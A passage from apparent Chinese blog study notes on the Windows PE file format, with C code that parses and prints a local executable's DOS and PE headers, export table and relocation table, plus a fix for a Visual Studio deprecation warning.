string">"导出表的OFFSET：%08X\n"</span><span class="token punctuation">,</span> <span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pExportDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"特征值：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>Characteristics<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"基址：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>Base<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"名称OFFSET：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>Name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"名称：%s\n"</span><span class="token punctuation">,</span> szName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"函数数量：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>NumberOfFunctions<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"函数名数量：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>NumberOfNames<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"函数地址：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>AddressOfFunctions<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"函数名称地址：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>AddressOfNames<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"函数名称序号：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>AddressOfNameOrdinals<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	<span class="token comment">// 函数数量</span></pre></td></tr><tr><td data-num="31"></td><td><pre>	DWORD dwNumOfFun <span class="token operator">=</span> pExport<span class="token operator">-></span>NumberOfFunctions<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>	<span class="token comment">// 函数名数量</span></pre></td></tr><tr><td data-num="33"></td><td><pre>	DWORD dwNumOfNames <span class="token operator">=</span> pExport<span class="token operator">-></span>NumberOfNames<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>	<span class="token comment">// 基址</span></pre></td></tr><tr><td data-num="35"></td><td><pre>	DWORD dwBase <span class="token operator">=</span> pExport<span class="token operator">-></span>Base<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>	<span class="token comment">// 导出地址表</span></pre></td></tr><tr><td data-num="37"></td><td><pre>	PDWORD pEat32 <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pExport<span class="token operator">-></span>AddressOfFunctions<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>	<span class="token comment">// 导出名称表</span></pre></td></tr><tr><td data-num="39"></td><td><pre>	PDWORD pEnt32 <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pExport<span class="token operator">-></span>AddressOfNames<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>	<span class="token comment">// 导出序号表</span></pre></td></tr><tr><td data-num="41"></td><td><pre>	PWORD pId <span class="token operator">=</span> <span class="token punctuation">(</span>PWORD<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pExport<span class="token operator">-></span>AddressOfNameOrdinals<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>	<span class="token keyword">for</span> <span class="token punctuation">(</span>DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dwNumOfFun<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span>pEat32<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>			<span class="token keyword">continue</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>		DWORD Id <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> Id <span class="token operator">&lt;</span> dwNumOfNames<span class="token punctuation">;</span> Id<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>			<span class="token keyword">if</span> <span class="token punctuation">(</span>pId<span class="token punctuation">[</span>Id<span class="token punctuation">]</span> <span class="token operator">==</span> i<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="52"></td><td><pre>			<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>				<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>			<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span>Id <span class="token operator">==</span> dwNumOfNames<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="57"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Id：%x Address：0x%08X Name[NULL]\n"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> dwBase<span class="token punctuation">,</span> pEat32<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>		<span class="token keyword">else</span></pre></td></tr><tr><td data-num="61"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>			<span class="token keyword">char</span> <span class="token operator">*</span> szFunName <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pEnt32<span class="token punctuation">[</span>Id<span class="token punctuation">]</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Id：%x Address：0x%08X Name[%s]\n"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> dwBase<span class="token punctuation">,</span> pEat32<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>szFunName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="66"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="运行结果"><a class="anchor" href="#运行结果">#</a> 运行结果</h2>
<h3 id="无导出表测试结果"><a class="anchor" href="#无导出表测试结果">#</a> 无导出表测试结果</h3>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220226195202771.png" alt="image-20220226195202771" /></p>
<h3 id="有导出表测试结果"><a class="anchor" href="#有导出表测试结果">#</a> 有导出表测试结果</h3>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220226195344675.png" alt="image-20220226195344675" /></p>
<h1 id="重定位表结构解析"><a class="anchor" href="#重定位表结构解析">#</a> 重定位表结构解析</h1>
<p>VS 中的重定位结构 <code>IMAGE_BASE_RELOCATION</code></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_BASE_RELOCATION</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    DWORD   VirtualAddress<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    DWORD   SizeOfBlock<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">//  WORD    TypeOffset[1];</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_BASE_RELOCATION<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">typedef</span> IMAGE_BASE_RELOCATION UNALIGNED <span class="token operator">*</span> PIMAGE_BASE_RELOCATION<span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220227115703323.png" alt="image-20220227115703323" /></p>
<ul>
<li>VirtualAddress：指向 PE 中需要重定向的 Rva</li>
<li>SizeOfBlock：体积总和</li>
</ul>
<p>lordPE 中重定位表</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220227121319288.png" alt="image-20220227121319288" /></p>
<h2 id="测试代码-2"><a class="anchor" href="#测试代码-2">#</a> 测试代码</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 解析重定位表的函数</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">void</span> <span class="token function">RelocTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">void</span> <span class="token function">RelocTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token comment">// 定义结构</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_TYPE</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>		WORD Offset <span class="token operator">:</span> <span class="token number">12</span><span class="token punctuation">;</span><span class="token comment">// 偏移</span></pre></td></tr><tr><td data-num="9"></td><td><pre>		WORD Type <span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token punctuation">&#125;</span>TYPE<span class="token punctuation">,</span><span class="token operator">*</span>PTYPE<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token comment">// 定位重定位表</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	PIMAGE_DATA_DIRECTORY pRelocDir <span class="token operator">=</span> <span class="token punctuation">(</span>pNt<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>DataDirectory <span class="token operator">+</span> IMAGE_DIRECTORY_ENTRY_BASERELOC<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token comment">// 填充重定位表的结构</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	PIMAGE_BASE_RELOCATION pReloc <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_BASE_RELOCATION<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pRelocDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	<span class="token comment">// 定位区段</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	PIMAGE_SECTION_HEADER pSection <span class="token operator">=</span> <span class="token function">IMAGE_FIRST_SECTION</span><span class="token punctuation">(</span>pNt<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token keyword">while</span> <span class="token punctuation">(</span>pReloc<span class="token operator">-></span>SizeOfBlock <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>		<span class="token comment">// 找到本 0x1000 个字节的起始位置</span></pre></td></tr><tr><td data-num="24"></td><td><pre>		DWORD dwCount <span class="token operator">=</span> <span class="token punctuation">(</span>pReloc<span class="token operator">-></span>SizeOfBlock <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>		DWORD dwRva <span class="token operator">=</span> pReloc<span class="token operator">-></span>VirtualAddress<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>		<span class="token comment">// 数组节点</span></pre></td></tr><tr><td data-num="27"></td><td><pre>		PTYPE pRelocArr <span class="token operator">=</span> <span class="token punctuation">(</span>PTYPE<span class="token punctuation">)</span><span class="token punctuation">(</span>pReloc <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"区段：%s\n"</span><span class="token punctuation">,</span> pSection<span class="token operator">-></span>Name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"RVA：%08X\n"</span><span class="token punctuation">,</span> dwRva<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"项目：%X H / %d D\n"</span><span class="token punctuation">,</span> pReloc<span class="token operator">-></span>SizeOfBlock<span class="token punctuation">,</span> pReloc<span class="token operator">-></span>SizeOfBlock<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>		<span class="token comment">// 找到下一个 0x1000 字节的结构体</span></pre></td></tr><tr><td data-num="32"></td><td><pre>		pReloc <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_BASE_RELOCATION<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>pReloc <span class="token operator">+</span> pReloc<span class="token operator">-></span>SizeOfBlock<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dwCount<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>			PDWORD pData <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pRelocArr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Offset <span class="token operator">+</span> dwRva<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>			DWORD pDataOffset <span class="token operator">=</span> <span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pRelocArr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Offset <span class="token operator">+</span> dwRva<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"RVA：%08X\n"</span><span class="token punctuation">,</span> pRelocArr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Offset <span class="token operator">+</span> dwRva<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"区段：%08X\n"</span><span class="token punctuation">,</span> pData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"偏移：%08X\n\n"</span><span class="token punctuation">,</span> pDataOffset<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="42"></td><td><pre></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="运行结果-2"><a class="anchor" href="#运行结果-2">#</a> 运行结果</h2>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220227123237585.png" alt="image-20220227123237585" /></p>
]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows PE文件结构解析Studying Notes之概述与MS-DOS和PE头解析</title>
    <url>/article/ac0ed2e7.html</url>
    <content><![CDATA[<p>路飞桑 yyds！！！</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213080423858.png" alt="image-20220213080423858" /></p>
<h2 id="概述"><a class="anchor" href="#概述">#</a> 概述</h2>
<p>PE（Portable Execute）文件是 Windows 下可移植、可执行文件的总称，常见的有 DLL，EXE，OCX，SYS，COM 等都是 PE 文件，PE 文件是微软 Windows 操作系统上的程序文件（可能是间接被执行，如 DLL）。</p>
<p>而事实上，一个文件是否是 PE 文件与其扩展名无关，PE 文件可以是任何扩展名。</p>
<p>PE 文件的结构一般来说如下图所示：从起始位置开始依次是 MS-DOS 头，标准 PE 头，扩展 PE 头，数据目录，以及节表。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213055508431.png" alt="image-20220213055508431" /></p>
<h2 id="ms-dos"><a class="anchor" href="#ms-dos">#</a> MS-DOS</h2>
<p>使用 010 打开一个 exe 文件可以看到 MS-DOS 头</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213061241744.png" alt="image-20220213061241744" /></p>
<p>MS-DOS 头出于兼容性的目的而存在，主要是为了防止 PE 文件运行在 MS-DOS 系统下出现错误。</p>
<h3 id="ms-dos头结构"><a class="anchor" href="#ms-dos头结构">#</a> MS-DOS 头结构</h3>
<p>通过 <code>_IMAGE_DOS_HEADER</code>  结构体读取我们所要的 MS-DOS 头</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213062739666.png" alt="image-20220213062739666" /></p>
<p>MS-DOS 标识：4D5A</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213062943734.png" alt="image-20220213062943734" /></p>
<p>头标志判断是否为 MS-DOS 头</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213063119930.png" alt="image-20220213063119930" /></p>
<p>指向新的 PE 头</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213063158508.png" alt="image-20220213063158508" /></p>
<h3 id="读取程序"><a class="anchor" href="#读取程序">#</a> 读取程序</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	FILE <span class="token operator">*</span> pFile <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token keyword">int</span> nFileLength <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	pFile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\21r000\\Desktop\\PE编辑器\\PEditor.exe"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token function">fseek</span><span class="token punctuation">(</span>pFile<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">SEEK_END</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	nFileLength <span class="token operator">=</span> <span class="token function">ftell</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token function">rewind</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token keyword">int</span> imageLength <span class="token operator">=</span> nFileLength <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	buffer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>imageLength<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token function">memset</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nFileLength <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token function">fread</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> imageLength<span class="token punctuation">,</span> pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token comment">//_IMAGE_DOS_HEADER</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	PIMAGE_DOS_HEADER ReadDosHeader<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	ReadDosHeader <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"MS-DOS Info:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"MZ标志位：%x\n"</span><span class="token punctuation">,</span> ReadDosHeader<span class="token operator">-></span>e_magic<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"PE头偏移：%x\n"</span><span class="token punctuation">,</span> ReadDosHeader<span class="token operator">-></span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre>	<span class="token function">free</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="运行结果"><a class="anchor" href="#运行结果">#</a> 运行结果</h3>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213065944374.png" alt="image-20220213065944374" /></p>
<h3 id="报错"><a class="anchor" href="#报错">#</a> 报错</h3>
<pre><code class="language-ABAP">1&gt;c:\users\21r000\source\repos\project3\project3\pe.cpp(9): error C4996: 'fopen': This function or variable may be unsafe. Consider using fopen_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details.
</code></pre>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213065505363.png" alt="image-20220213065505363" /></p>
<h4 id="解决方法"><a class="anchor" href="#解决方法">#</a> 解决方法</h4>
<pre><code class="language-ABAP">项目-&gt;XX属性-&gt;C++-&gt;预处理器-&gt;在预处理器定义添加“_CRT_SECURE_NO_WARNINGS”
</code></pre>
<p>具体操作如图：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213065712939.png" alt="image-20220213065712939" /></p>
<p>添加 <code>_CRT_SECURE_NO_WARNINGS</code>  即可</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213065851431.png" alt="image-20220213065851431" /></p>
<h2 id="pe头"><a class="anchor" href="#pe头">#</a> PE 头</h2>
<h3 id="pe头结构"><a class="anchor" href="#pe头结构">#</a> PE 头结构</h3>
<p>PE 头分为：</p>
<ul>
<li>标准 PE 头：每一个 PE 文件中都有。</li>
<li>扩展 PE 头：可有可无。</li>
</ul>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213071122271.png" alt="image-20220213071122271" /></p>
<p><code>_IMAGE_NT_HEADERS</code> ，分为 32 位和 64 位两个版本，根据逆向解析的程序使用相应的版本。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213070757581.png" alt="image-20220213070757581" /></p>
<p>PE 标识：5045</p>
<p><code>IMAGE_FILE_HEADER</code>  定义</p>
